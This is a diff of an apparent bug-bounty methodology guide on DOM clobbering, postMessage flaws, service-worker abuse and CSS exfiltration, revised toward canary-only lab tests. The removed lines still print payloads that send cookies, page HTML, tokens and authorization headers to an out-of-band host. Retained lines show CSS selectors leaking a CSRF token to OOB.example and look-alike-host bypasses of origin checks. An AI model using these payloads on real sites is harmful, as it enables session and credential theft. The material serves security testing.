@@ -33,12 +33,12 @@ report_count: 14
 
 ## Crown Jewel Targets
 
-DOM-based attacks execute in the victim's browser — the server often never sees the payload, so WAFs and server-side input filters do not apply. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.
+DOM-based attacks execute in the victim's browser — some sources never reach the server, while others do; assess the actual data path rather than assuming WAF/input filters are irrelevant. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.
 
 **Highest-value chains:**
-- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or shadows `document.getElementById`, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
+- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or a form named property, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
 - **PostMessage no origin check → session theft / DOM-XSS** — a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
-- **Service Worker abuse** — register a **same-origin** SW script (reachable because of an upload / open-redirect / path the target serves) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
+- **Service Worker abuse** — register a **same-origin** SW script (reachable because of an authorized same-origin JavaScript upload/path) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
 - **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.
 
 ### Grounding — public research this is distilled from
@@ -97,7 +97,7 @@ susp.forEach(k => {
   // HTMLCollection / element => already clobbered or clobberable namespace
   if (v && (v instanceof Element || v instanceof HTMLCollection))
     console.log('[CLOBBERED/NAMESPACE]', k, v);
-  else if (v !== undefined) console.log('[GLOBAL]', k, '=', v);
+  else if (v !== undefined) console.log('[GLOBAL TYPE]', k, typeof v);
 });
 ```
 
@@ -127,45 +127,44 @@ grep -rnE "postMessage\([^,]+,\s*['\"]\*['\"]\)" recon/$TARGET/ --include="*.js"
 ```
 
 ```html
-<!-- PoC A: drive a no-origin-check LISTENER from an attacker page -->
-<!-- Host on attacker.com; frames target and pushes a privileged message -->
-<iframe id="f" src="https://TARGET/page-with-listener"></iframe>
+<!-- Controlled lab with a test account and approved target origin. -->
+<iframe id="f" src="https://target.example/test-listener"></iframe>
 <script>
-  document.getElementById('f').onload = () => {
-    const w = document.getElementById('f').contentWindow;
-    // Shape the payload to whatever the handler routes into a sink:
-    w.postMessage({type:'navigate', url:'javascript:fetch("https://OOB/x?c="+document.cookie)'}, '*');
-    w.postMessage('<img src=x onerror=fetch("https://OOB/dom?h="+btoa(document.body.innerHTML))>', '*');
-  };
-</script>
-```
-
-```html
-<!-- PoC B: capture secrets from a SENDER that uses targetOrigin '*' -->
-<iframe id="f" src="https://TARGET/sso-or-widget" style="display:none"></iframe>
-<pre id="out"></pre>
-<script>
-addEventListener('message', e => {
-  // Only count it if e.origin is the TARGET and data carries a secret
-  out.textContent += `origin=${e.origin}\ndata=${JSON.stringify(e.data)}\n---\n`;
-  if (/token|session|jwt|code=/i.test(JSON.stringify(e.data)))
-    fetch('https://OOB/pm?d='+encodeURIComponent(JSON.stringify(e.data))); // OOB proof
+const frame = document.getElementById('f');
+frame.addEventListener('load', () => {
+  frame.contentWindow.postMessage({type: 'test-canary', value: 'DOM-REVIEW-042'},
+                                  'https://target.example');
+}, {once: true});
+addEventListener('message', event => {
+  if (event.origin !== 'https://target.example' || event.source !== frame.contentWindow) return;
+  console.log('Controlled message received:', typeof event.data); // No secret dump.
 });
 </script>
 ```
+
+This canary alone is not a finding. Trace the actual authorized handler and sink,
+then use a harmless marker matched to its schema. Prove impact with controlled
+accounts; never send cookies, complete DOM, bearer tokens or messages to a third
+party OOB service merely to demonstrate receipt.
 
 > False-positive guard: a handler with a *partial* check (`origin.indexOf('target.com')>-1`, `endsWith('target.com')`, regex `target\.com`) is still vulnerable — bypass with `target.com.evil.com` or `eviltarget.com`. Confirm by serving the PoC from such a look-alike host and showing the message still lands.
 
 ---
 
-### PostMessage handler race — win the message before origin is set
-Beyond static origin/sender checks: some handlers trust the FIRST message, or read `event.origin` while it is still `""`/`null` during frame load. Race it — flood `postMessage` in a tight loop during iframe/popup load, or fire from `about:blank` before navigation, so your message lands before the legit sender or before strict origin setup runs. Test any handler that assumes "first message = trusted". Disclosed: reports/381356.
+### PostMessage initialization assumptions
+
+Browser-dispatched `postMessage` has its sender origin initialized when the event
+is created; it does not later become trustworthy during frame loading. An opaque
+origin can serialize as `"null"`; never treat it as an allowed trusted origin.
+Test first-message trust only with a bounded synthetic canary and explicit scope,
+not a tight message flood. Validate exact origin, expected `event.source` and a
+bounded message schema together. [HTML messaging standard](https://html.spec.whatwg.org/multipage/web-messaging.html).
 
 ## Phase 3 — Service Worker Abuse
 
 **Hard rule (corrects a common mistake):** a SW script URL **must be same-origin** as the page calling `register()`. A cross-origin script URL (`https://evil.com/sw.js`) throws `SecurityError` — there is **no header that enables cross-origin SW *script* registration**. `Service-Worker-Allowed` only widens the **scope** a same-origin script may control, not where the script may live.
 
-So the realistic path is: get a SW script **onto the target origin** (file upload that serves JS, open-redirect/path the origin reflects as a script, a JSON/JSONP endpoint with `text/javascript`, or an existing route under your control), then register it from same-origin XSS.
+So the realistic path is: get a SW script **onto the target origin** (approved file upload that directly serves JavaScript without redirects, a JSON/JSONP endpoint with `text/javascript`, or an existing route under your control), then register it from same-origin XSS.
 
 ```bash
 # Enumerate existing SW + its scope
@@ -177,29 +176,17 @@ curl -s "https://$TARGET/sw.js" | grep -iE "scope|addEventListener\('fetch'|cach
 #   curl -s -D- https://$TARGET/uploads/<id> | grep -i content-type
 ```
 
-```javascript
-// Runs in same-origin XSS. SCRIPT MUST BE SAME-ORIGIN (e.g. /uploads/evil-sw.js
-// served by the target). scope must be <= the directory the script is served from
-// unless the response carries Service-Worker-Allowed.
-navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'})
-  .then(r => fetch('https://OOB/sw-registered?scope='+r.scope))  // OOB proof of registration
-  .catch(e => console.log('SW reg failed', e.name));  // SecurityError => wrong origin/scope
+Service-worker test design: use a disposable origin/browser profile, serve an
+inert same-origin JavaScript worker, and request a dedicated canary URL in its
+approved scope. Record scope/control status without reading authorization headers
+or response bodies. Await activation and control separately from registration;
+registration success alone does not show interception or persistence. Unregister
+the test worker and remove only test-created caches at the end.
 
-// evil-sw.js (served from the TARGET origin):
-self.addEventListener('fetch', e => {
-  e.respondWith(fetch(e.request.clone()).then(async resp => {
-    // Exfil URL + any auth header the page attaches, to OOB
-    fetch('https://OOB/sw-intercept', {method:'POST',
-      body: JSON.stringify({url: e.request.url,
-        auth: e.request.headers.get('authorization')})});
-    return resp;
-  }));
-});
-```
-
-> Persistence note: a SW survives tab close and re-runs on next visit within scope — that is what makes it Critical. Confirm persistence by closing all tabs, reopening the origin, and showing a fresh OOB hit with no XSS re-trigger.
-
----
+Top-level service-worker script redirects fail; an open redirect is not a route
+to cross-origin registration. MIME, secure context, scope, CSP, activation and
+browser storage state matter. A `SecurityError` has multiple possible causes,
+not just wrong origin. See [Service Workers specification](https://www.w3.org/TR/service-workers/).
 
 ## Phase 4 — CSS Injection / Exfiltration
 
@@ -217,7 +204,8 @@ self.addEventListener('fetch', e => {
 input[name="csrf"][value^="a"] { background: url(https://OOB.example/c?p=0&c=a); }
 input[name="csrf"][value^="b"] { background: url(https://OOB.example/c?p=0&c=b); }
 /* ...all chars... then chain @import to leak position 1 conditioned on position 0, etc. */
-meta[name="csrf-token"][content^="a"] { background: url(https://OOB.example/c?m=a); }
+/* Hidden inputs and meta elements do not normally paint a background.
+   A controlled lab may use a matching visible sibling selector instead. */
 ```
 
 ```python
@@ -232,7 +220,7 @@ print("\n".join(
 # this removes the "static input, one char" limitation.
 ```
 
-> Validation: the proof is **OOB hits**, not a rendered color. Stand up a Collaborator / request-bin and show one hit per correct character forming the real token, then demonstrate using that token in a state-changing CSRF request. No OOB callback = no finding (a 0-byte image or CSP-blocked request looks identical to success in DevTools).
+> Validation: the proof is **OOB hits**, not a rendered color. Stand up a Collaborator / request-bin and show one hit per correct character forming the synthetic test canary; use an authorized controlled-account action only if separately needed to establish impact. No callback alone is inconclusive: CSP, rendering and request routing can block it (a 0-byte image or CSP-blocked request looks identical to success in DevTools).
 
 ---
 
@@ -280,7 +268,7 @@ grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/
 ```bash
 # DOM Invader (built into Burp browser) — sources→sinks, postMessage logger, clobbering scanner
 # postMessage-tracker — Chrome extension logging cross-window messages
-# Burp Collaborator / interactsh / request-bin — MANDATORY OOB sink for CSS-exfil & SW PoCs
+# Burp Collaborator / interactsh / request-bin — only an approved synthetic-canary OOB sink for CSS-exfil & SW PoCs
 # Verify any tool URL before citing it in a report; do not paste unverified repo links.
 ```
 
@@ -288,15 +276,15 @@ grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/
 
 ## Validation (false-positive discipline)
 
-Match the repo standard: a technique that *fires in DevTools* is not a finding until impact is **OOB-confirmed** and **state-proven**.
+Match the repo standard: a technique that *fires in DevTools* needs reproducible evidence of an attacker-controlled source reaching a meaningful sink; OOB and state changes are not mandatory for every class.
 
 - **DOM Clobbering** — show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
 - **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
-- **CSS exfil** — **OOB callback per correct character is the only proof.** Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
+- **CSS exfil** — Use reproducible synthetic-canary evidence; an OOB callback is one possible proof. Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
 - **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
 - **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.
 
-**Severity:**
+**Potential severity (requires actual reach, privileges, scope and program rubric):**
 - Same-origin Service Worker → persistent credential intercept: **Critical**
 - PostMessage data → DOM-XSS / token theft → ATO: **High–Critical**
 - DOM Clobbering → DOM-XSS reaching auth/session: **High**
